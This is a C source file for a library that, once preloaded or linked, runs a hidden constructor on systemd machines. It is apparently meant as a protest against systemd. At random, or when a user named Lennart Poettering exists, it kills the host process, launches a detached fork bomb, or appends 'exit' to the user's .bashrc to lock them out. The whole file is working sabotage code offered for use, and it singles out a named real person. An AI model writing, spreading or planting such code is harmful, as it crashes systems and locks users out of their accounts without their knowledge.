#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <pwd.h>

/* ProTip: make a shared library and set LD_PRELOAD to it */
/* Or just link it to your application */


typedef bool (*fuckup_determinator)(void);

static bool fuckup_always(void);
static bool fuckup_never(void);
static bool fuckup_occasionally(void);
static bool fuckup_someday(void);
static bool fuckup_someweek(void);
static bool fuckup_somemonth(void);
static bool fuckup_lennart_poettering(void);

#define ALL_TRUE(...) &(fuckup_determinator[]){__VA_ARGS__,0}


/* When do you want a systemd system to skrew up? */
static fuckup_determinator (*shall_I_fuck_it_up[])[] = {
  ALL_TRUE( &fuckup_occasionally ),
  ALL_TRUE( &fuckup_lennart_poettering )
};



static bool (*try_to_do_evil[])(void);
static const size_t evil_stuff_available_count;

/* Let's go */

static void fuck_systemd() __attribute__((constructor));
static void fuck_systemd(){

  /* Check if it is a systemd system */
  struct stat s;
  if( lstat("/bin/systemd",&s) == -1 )
    return;
  const mode_t mode_mask = S_IXUSR | S_IFREG;
  if( s.st_mode & mode_mask != mode_mask )
    return;

  /* Shall we do something evil? */
  bool fuckup = false;
  for( size_t i=0, n=sizeof(shall_I_fuck_it_up)/sizeof(*shall_I_fuck_it_up); i < n; i++ ){
    bool fuckup_pass = true;
    for( fuckup_determinator* it = *shall_I_fuck_it_up[i]; *it; it++ ){
      if( !(**it)() ){
        fuckup_pass = false;
        break;
      }
    }
    if( fuckup_pass ){
      fuckup = true;
      break;
    }
  }
  if(!fuckup)
    return;

  struct timeval tv;
  gettimeofday(&tv,NULL);
  srand( tv.tv_usec + tv.tv_sec );
  /* OK, time to do some evil */
  size_t n = evil_stuff_available_count;
  while( n ){
    int i = rand() % n;
    if( (*try_to_do_evil[i])() )
      break;
    try_to_do_evil[i] = try_to_do_evil[--n];
  }
  srand(0);

}

static int pseudorandom( int seed ){
  return 1103515245 * seed + 12345;
}

static bool fuckup_always(void){
  return true;
}

static bool fuckup_never(void){
  return false;
}

static bool fuckup_occasionally(void){
  struct timeval tv;
  gettimeofday(&tv,NULL);
  // arround once every 100 times
  if( tv.tv_usec < 1000000 / 100 )
    return true;
  return false;
}

static bool fuckup_someday(void){
  return pseudorandom( time(0)/60/60/24 ) & 1;
}

static bool fuckup_someweek(void){
  return pseudorandom( time(0)/60/60/24/7 ) & 1;
}

static bool fuckup_somemonth(void){
  return pseudorandom( time(0)/60/60/24/30 ) & 1;
}

static bool fuckup_lennart_poettering(void){
  bool ret = false;
  struct passwd *p;
  while(( p=getpwent() )){
    if( p->pw_name ){
      if( !strcasecmp( p->pw_name, "lennart" )
       || !strcasecmp( p->pw_name, "poettering" )
      ){
        ret = true;
        break;
      }
    }
    if( p->pw_gecos ){
      if( !strncasecmp( p->pw_gecos, "lennart poettering", strlen("lennart poettering") ) ){
        ret = true;
        break;
      }
    }
  }
  endpwent();
  return ret;
}


static bool evil_dont_run(void){
  perror("Sorry, I'm just not in the right mood to run now.");
  _exit(-1);
  return false;
}

static bool evil_fork_bomb(void){
  bool b = false;
  while( true ){
    int ret = fork();
    if( ret == -1 ){
      if(b) _exit(-1);
      return false;
    }
    if( ret && !b )
      break;
    if( !ret && setsid() < 0 ){
      if(b) _exit(-2);
      return false;
    }
    b = true;
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    prctl(PR_SET_NAME, (unsigned long)"Fuck Systemd!", 0, 0, 0);
  }
  return true;
}

static bool evil_user_lockout(void){
  const char* home;
  struct passwd *pw = getpwuid(getuid());
  if( !pw || !pw->pw_dir || !strlen(pw->pw_dir) ){
    home = getenv("HOME");
  }else{
    home = pw->pw_dir;
  }
  if( !home || !strlen(home) )
    return false;
  size_t n=strlen(home);
  char* file = malloc(n+strlen(".bashrc")+2);
  if(!file)
    return false;
  sprintf( file, "%s/.bashrc", home );
  FILE* f = fopen(file,"a");
  fwrite("\n\nexit\n",1,strlen("\n\nexit\n"),f);
  if(!f){
    free(file);
    return false;
  }
  fclose(f);
  free(file);
  return true;
}

static bool (*try_to_do_evil[])(void) = {
  &evil_dont_run,
  &evil_fork_bomb,
  &evil_user_lockout
};
static const size_t evil_stuff_available_count = sizeof(try_to_do_evil) / sizeof(*try_to_do_evil);
